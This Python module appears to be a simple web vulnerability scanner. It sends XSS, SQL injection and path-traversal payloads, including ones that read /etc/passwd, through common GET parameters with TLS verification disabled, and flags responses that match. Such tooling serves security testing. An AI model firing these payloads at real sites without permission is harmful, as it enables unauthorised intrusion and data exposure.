import requests
from urllib.parse import urljoin

# Common payloads for basic checks
PAYLOADS = {
    "xss": ["<svg onload=alert(1)>", "\"><img src=x onerror=alert(1)>"],
    "sqli": ["' OR '1'='1", "\" OR \"1\"=\"1", "';--"],
    "lfi": ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc/passwd"]
}

def run(base_url, params=None):
    findings = []
    if params is None:
        params = ["id", "q", "search", "file", "redirect"]

    for param in params:
        for vuln_type, payloads in PAYLOADS.items():
            for p in payloads:
                try:
                    # Build request
                    url = f"{base_url}?{param}={p}"
                    r = requests.get(url, timeout=5, verify=False)

                    # Check reflections / common signatures
                    if vuln_type == "xss" and p in r.text:
                        findings.append({
                            "type": "XSS",
                            "param": param,
                            "payload": p,
                            "url": url,
                            "evidence": "payload reflected in response"
                        })

                    if vuln_type == "sqli" and ("syntax" in r.text.lower() or "sql" in r.text.lower()):
                        findings.append({
                            "type": "SQLi",
                            "param": param,
                            "payload": p,
                            "url": url,
                            "evidence": "SQL error string in response"
                        })

                    if vuln_type == "lfi" and "root:x" in r.text:
                        findings.append({
                            "type": "LFI",
                            "param": param,
                            "payload": p,
                            "url": url,
                            "evidence": "Found /etc/passwd content"
                        })

                except Exception as e:
                    findings.append({
                        "type": "Error",
                        "param": param,
                        "payload": p,
                        "url": url,
                        "evidence": str(e)
                    })

    return findings

